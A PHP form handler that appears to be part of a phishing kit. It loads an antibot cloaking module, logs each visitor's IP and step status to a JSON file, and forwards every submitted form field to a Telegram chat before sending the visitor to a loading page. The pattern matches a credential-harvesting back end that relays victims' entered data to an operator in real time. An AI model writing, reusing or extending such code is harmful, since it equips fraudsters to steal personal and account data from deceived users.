<?php
require_once __DIR__ . '/../antibot/antibot.php';
session_start();
require_once __DIR__ . '/../config.php';
require_once __DIR__ . '/steps.php';
require_once __DIR__ . '/telegram.php';

// Unified participant status updater with file locking
function updateParticipantStatus($participant_id, $status) {
    $session_file = __DIR__ . '/../session/participants.json';
    if (!file_exists($session_file)) {
        file_put_contents($session_file, json_encode([]));
    }
    $fp = fopen($session_file, 'c+');
    if (!$fp) { return; }
    flock($fp, LOCK_EX);
    $raw = stream_get_contents($fp);
    $participants = $raw ? json_decode($raw, true) : [];
    if (!is_array($participants)) { $participants = []; }
    $ip_address = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $existing_ip = isset($participants[$participant_id]) ? $participants[$participant_id]['ip'] : $ip_address;
    $participants[$participant_id] = [
        'id' => $participant_id,
        'status' => $status,
        'ip' => $existing_ip
    ];
    ftruncate($fp, 0);
    rewind($fp);
    fwrite($fp, json_encode($participants, JSON_PRETTY_PRINT));
    fflush($fp);
    flock($fp, LOCK_UN);
    fclose($fp);
}

// Check if form was submitted
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo '<h1>Method Not Allowed</h1>';
    exit;
}

$participant_id = $_POST['participant_id'] ?? '';
$question_number = $_POST['question_number'] ?? '';
if ($participant_id === '' || $question_number === '') {
    http_response_code(400);
    echo 'Missing participant or question number';
    exit;
}

$step = getStep($question_number);
if (!$step) {
    updateParticipantStatus($participant_id, 'unknown_step_' . $question_number);
    http_response_code(400);
    echo 'Unknown step submitted';
    exit;
}

// Validate required fields
$missing = validateRequiredFields($step, $_POST);
if (!empty($missing)) {
    updateParticipantStatus($participant_id, $step['status_enter'] . ' error');
    http_response_code(422);
    echo 'Missing required fields: ' . implode(', ', $missing);
    exit;
}

// Mark processing
updateParticipantStatus($participant_id, $step['status_processing']);

// Build Telegram message using modular builder
$telegramMessage = buildTelegramMessage($question_number, $_POST, $participant_id);
sendTelegramMessage($telegramMessage);

// Mark completion for this step
updateParticipantStatus($participant_id, $step['status_complete']);

// Redirect to loading (central progress page)
header('Location: loading.php');
exit;
?>
